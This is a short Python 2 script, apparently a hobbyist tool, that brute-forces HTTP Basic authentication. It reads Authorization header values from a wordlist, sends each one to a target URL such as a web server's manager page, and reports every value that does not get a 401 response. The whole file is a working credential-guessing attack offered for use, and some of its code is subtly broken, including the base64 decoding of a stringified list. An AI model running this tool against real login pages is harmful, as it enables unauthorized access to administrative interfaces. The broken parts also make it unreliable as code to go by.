#coding:utf-8
#author:Blood_Zer0
#file:http_auth_brute.py
#time:2017/2/16 上午11:13

import requests
import re
import base64
import sys

def judge_state(self):
    try:
        res = requests.get(self,verify = True)
    except requests.HTTPError as e:
        print "Http Error"
        exit()

def judge_file(self):
    try:
        open(self,'r')
    except IOError as e:
        print "can't find file"
        exit()

def judge_opt():
    if(len(sys.argv)==3):
        pass
    else:
        print "usage:python http_auth_brute.py http://www.xxx.com/manager/html pass_file"
        exit()

if __name__ == "__main__":
    judge_opt()
    judge_file(sys.argv[2])
    judge_state(sys.argv[1])

    for keyword in open(sys.argv[2],'r').readlines():
        headers = {'Authorization':keyword.strip()}
        try:
            response = requests.get(sys.argv[1],headers=headers,verify = True)
            if(re.search('401 Unauthorized',response.text)):
                pass
            else:
                print "success: " + base64.b64decode(str(keyword.strip().split(' ')))
        except requests.HTTPError as e:
            pass
